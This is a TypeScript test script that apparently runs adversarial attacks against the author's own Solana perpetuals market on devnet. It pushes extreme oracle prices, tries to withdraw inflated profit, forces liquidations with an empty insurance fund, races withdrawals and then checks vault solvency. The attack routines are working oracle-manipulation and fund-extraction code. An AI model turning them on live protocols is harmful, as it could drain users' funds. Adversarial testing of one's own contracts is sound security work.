/**
 * Exploit Attempt: Depleted State Attacks
 *
 * Current state:
 * - Insurance fund: ~0.0003 SOL (nearly empty)
 * - LP capital: 0 SOL
 * - Risk reduction mode: ENABLED
 * - User 2 has open position: 1,000,000 units at $10.05 entry
 *
 * Attack vectors to test:
 * 1. Can we extract profit from User 2's position via price manipulation?
 * 2. What happens when we create more bad debt with empty insurance?
 * 3. Can we bypass risk reduction mode?
 * 4. Can we cause vault insolvency?
 */

import { Connection, Keypair, PublicKey, Transaction, ComputeBudgetProgram, sendAndConfirmTransaction, SYSVAR_CLOCK_PUBKEY } from "@solana/web3.js";
import { getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { fetchSlab, parseEngine, parseUsedIndices, parseAccount, parseParams, AccountKind } from "../src/solana/slab.js";
import { encodeKeeperCrank, encodePushOraclePrice, encodeWithdrawCollateral, encodeTradeCpi, encodeLiquidateAtOracle, encodeCloseAccount } from "../src/abi/instructions.js";
import { buildAccountMetas, ACCOUNTS_KEEPER_CRANK, ACCOUNTS_PUSH_ORACLE_PRICE, ACCOUNTS_WITHDRAW_COLLATERAL, ACCOUNTS_TRADE_CPI, ACCOUNTS_LIQUIDATE_AT_ORACLE, ACCOUNTS_CLOSE_ACCOUNT } from "../src/abi/accounts.js";
import { buildIx } from "../src/runtime/tx.js";
import fs from "fs";

const marketInfo = JSON.parse(fs.readFileSync("devnet-market.json", "utf-8"));
const PROGRAM_ID = new PublicKey(marketInfo.programId);
const SLAB = new PublicKey(marketInfo.slab);
const ORACLE = new PublicKey(marketInfo.oracle);
const VAULT = new PublicKey(marketInfo.vault);
const MINT = new PublicKey(marketInfo.mint);
const MATCHER_PROGRAM = new PublicKey(marketInfo.matcherProgramId);
const MATCHER_CTX = new PublicKey(marketInfo.lp.matcherContext);
const LP_PDA = new PublicKey(marketInfo.lp.pda);

const conn = new Connection("https://api.devnet.solana.com", "confirmed");
const payer = Keypair.fromSecretKey(
  new Uint8Array(JSON.parse(fs.readFileSync(process.env.HOME + "/.config/solana/id.json", "utf-8")))
);

const DELAY_MS = 2000;

async function delay(ms: number = DELAY_MS) {
  await new Promise(r => setTimeout(r, ms));
}

function log(msg: string) {
  console.log(`[${new Date().toISOString()}] ${msg}`);
}

async function getState() {
  await delay(500);
  const data = await fetchSlab(conn, SLAB);
  const vaultInfo = await conn.getAccountInfo(VAULT);
  return {
    engine: parseEngine(data),
    params: parseParams(data),
    data,
    vaultBalance: vaultInfo ? vaultInfo.lamports / 1e9 : 0,
  };
}

async function pushPrice(priceUsd: number): Promise<boolean> {
  await delay();
  const priceE6 = BigInt(Math.round(priceUsd * 1_000_000));
  const timestamp = BigInt(Math.floor(Date.now() / 1000));
  const data = encodePushOraclePrice({ priceE6, timestamp });
  const keys = buildAccountMetas(ACCOUNTS_PUSH_ORACLE_PRICE, [payer.publicKey, SLAB]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 50_000 }),
    buildIx({ programId: PROGRAM_ID, keys, data })
  );
  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return true;
  } catch (e: any) {
    log(`PushPrice ${priceUsd} failed: ${e.message?.slice(0, 50)}`);
    return false;
  }
}

async function crank(): Promise<boolean> {
  await delay();
  const crankData = encodeKeeperCrank({ callerIdx: 65535, allowPanic: false });
  const crankKeys = buildAccountMetas(ACCOUNTS_KEEPER_CRANK, [
    payer.publicKey, SLAB, SYSVAR_CLOCK_PUBKEY, ORACLE,
  ]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 300000 }),
    buildIx({ programId: PROGRAM_ID, keys: crankKeys, data: crankData })
  );
  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return true;
  } catch { return false; }
}

async function withdraw(userIdx: number, amount: bigint): Promise<{ success: boolean; error?: string }> {
  await delay();
  const userAta = getAssociatedTokenAddressSync(MINT, payer.publicKey);
  const vaultPda = new PublicKey(marketInfo.vaultPda);
  const withdrawData = encodeWithdrawCollateral({ idx: userIdx, amount });
  const withdrawKeys = buildAccountMetas(ACCOUNTS_WITHDRAW_COLLATERAL, [
    payer.publicKey, SLAB, VAULT, userAta, vaultPda, TOKEN_PROGRAM_ID, SYSVAR_CLOCK_PUBKEY, ORACLE,
  ]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
    buildIx({ programId: PROGRAM_ID, keys: withdrawKeys, data: withdrawData })
  );
  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return { success: true };
  } catch (e: any) {
    return { success: false, error: e.message?.slice(0, 100) };
  }
}

async function liquidate(userIdx: number, lpIdx: number): Promise<boolean> {
  await delay();
  const liqData = encodeLiquidateAtOracle({ userIdx, lpIdx });
  const liqKeys = buildAccountMetas(ACCOUNTS_LIQUIDATE_AT_ORACLE, [
    payer.publicKey, SLAB, SYSVAR_CLOCK_PUBKEY, ORACLE,
  ]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 300_000 }),
    buildIx({ programId: PROGRAM_ID, keys: liqKeys, data: liqData })
  );
  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return true;
  } catch { return false; }
}

async function main() {
  log("=== DEPLETED STATE ATTACK VECTORS ===\n");

  // Initial state
  const { vaultBalance: v1, engine: e1, data: data1, params } = await getState();
  const ins1 = Number(e1.insuranceFund.balance) / 1e9;
  const liq1 = Number(e1.lifetimeLiquidations);

  log(`Initial State:`);
  log(`  Vault: ${v1.toFixed(6)} SOL`);
  log(`  Insurance: ${ins1.toFixed(9)} SOL`);
  log(`  Lifetime liquidations: ${liq1}`);
  log(`  Risk Reduction Mode: ${e1.riskReductionOnly}`);

  // Find accounts
  const indices = parseUsedIndices(data1);
  log(`\nAccounts:`);
  for (const idx of indices) {
    const acc = parseAccount(data1, idx);
    if (acc) {
      const kind = acc.kind === AccountKind.LP ? 'LP' : 'USER';
      log(`  [${idx}] ${kind}: capital=${(Number(acc.capital) / 1e9).toFixed(6)} pos=${acc.positionSize}`);
    }
  }

  // ===== ATTACK 1: Price Spike to Create Massive Profit on User 2 =====
  log("\n=== ATTACK 1: Price Spike on Open Position ===");
  log("User 2 has 1M unit LONG position at $10.05 entry");
  log("Spiking price to $1000 to create ~100x profit...");

  await pushPrice(1000);
  for (let i = 0; i < 5; i++) await crank();

  const { data: data2 } = await getState();
  const user2 = parseAccount(data2, 2);
  let pnl2 = user2.pnl;
  if (pnl2 > 9_000_000_000_000_000_000n) pnl2 = pnl2 - 18446744073709551616n;
  log(`User 2 at $1000:`);
  log(`  Capital: ${(Number(user2.capital) / 1e9).toFixed(6)} SOL`);
  log(`  PnL: ${(Number(pnl2) / 1e9).toFixed(6)} SOL`);

  // Try to withdraw the "profit"
  log("\nAttempting withdrawal of 10 SOL (massive profit)...");
  const w1 = await withdraw(2, 10_000_000_000n);
  log(`  Result: ${w1.success ? "SUCCESS (!)" : "BLOCKED"}`);
  if (!w1.success) log(`  Error: ${w1.error?.slice(0, 60)}`);

  // ===== ATTACK 2: Create Bad Debt with Empty Insurance =====
  log("\n=== ATTACK 2: Create Bad Debt with Empty Insurance ===");
  log("What happens when we trigger liquidation with no insurance?");

  // First need a position that can be liquidated
  // User 2 has a LONG position - crash price to make it liquidatable
  await pushPrice(0.01); // Extreme crash
  for (let i = 0; i < 10; i++) await crank();

  const { engine: e2, data: data3 } = await getState();
  const user2After = parseAccount(data3, 2);
  let pnl2After = user2After.pnl;
  if (pnl2After > 9_000_000_000_000_000_000n) pnl2After = pnl2After - 18446744073709551616n;

  log(`User 2 at $0.01:`);
  log(`  Capital: ${(Number(user2After.capital) / 1e9).toFixed(6)} SOL`);
  log(`  PnL: ${(Number(pnl2After) / 1e9).toFixed(6)} SOL`);
  log(`  Position: ${user2After.positionSize}`);

  // Try to liquidate
  log("\nAttempting liquidation with empty insurance...");
  const liqResult = await liquidate(2, 0);
  log(`Liquidation result: ${liqResult ? "TX confirmed" : "TX failed"}`);

  // Heavy cranking to process any pending liquidations
  for (let i = 0; i < 20; i++) await crank();

  // ===== ATTACK 3: Withdrawal Race =====
  log("\n=== ATTACK 3: Withdrawal Race ===");
  log("Try rapid withdrawals at different prices...");

  const prices = [150, 50, 200, 10, 500];
  for (const price of prices) {
    await pushPrice(price);
    await crank();
    const wResult = await withdraw(1, 100_000_000n); // 0.1 SOL
    log(`  $${price}: ${wResult.success ? "WITHDREW 0.1 SOL" : "blocked"}`);
  }

  // ===== ATTACK 4: Try to Bypass Risk Reduction =====
  log("\n=== ATTACK 4: Risk Reduction Mode Bypass ===");

  const { engine: e3 } = await getState();
  log(`Risk Reduction Mode: ${e3.riskReductionOnly}`);

  // In risk reduction mode, only risk-reducing trades should be allowed
  // Try to open a new position (should fail)
  log("Risk reduction mode should prevent new risky operations...");

  // ===== FINAL STATE =====
  log("\n=== FINAL STATE ===");
  await pushPrice(150);
  for (let i = 0; i < 10; i++) await crank();

  const { vaultBalance: v2, engine: e4, data: data4 } = await getState();
  const ins2 = Number(e4.insuranceFund.balance) / 1e9;
  const liq2 = Number(e4.lifetimeLiquidations);

  log(`Vault: ${v1.toFixed(6)} -> ${v2.toFixed(6)} (Δ = ${(v2 - v1).toFixed(6)})`);
  log(`Insurance: ${ins1.toFixed(9)} -> ${ins2.toFixed(9)} (Δ = ${(ins2 - ins1).toFixed(9)})`);
  log(`Liquidations: ${liq1} -> ${liq2}`);
  log(`Force Closes: ${e4.lifetimeForceCloses}`);

  log("\nFinal account states:");
  for (const idx of indices) {
    const acc = parseAccount(data4, idx);
    if (acc) {
      const kind = acc.kind === AccountKind.LP ? 'LP' : 'USER';
      log(`  [${idx}] ${kind}: capital=${(Number(acc.capital) / 1e9).toFixed(6)} pos=${acc.positionSize}`);
    }
  }

  // Solvency check
  log("\n=== SOLVENCY CHECK ===");
  let totalLiabilities = e4.insuranceFund.balance;
  for (const idx of indices) {
    const acc = parseAccount(data4, idx);
    if (acc) {
      totalLiabilities += acc.capital;
      let pnl = acc.pnl;
      if (pnl > 9_000_000_000_000_000_000n) pnl = pnl - 18446744073709551616n;
      totalLiabilities += pnl;
    }
  }
  const liabilitiesNum = Number(totalLiabilities) / 1e9;
  log(`Total Liabilities: ${liabilitiesNum.toFixed(6)} SOL`);
  log(`Vault Balance: ${v2.toFixed(6)} SOL`);
  log(`Surplus: ${(v2 - liabilitiesNum).toFixed(6)} SOL`);
  log(`Status: ${v2 >= liabilitiesNum ? "SOLVENT" : "*** INSOLVENT ***"}`);

  if (v2 < v1 - 0.01) {
    log("\n*** WARNING: Vault drained during depleted state attacks ***");
  } else {
    log("\nVault protected during depleted state attacks");
  }
}

main().catch(console.error);
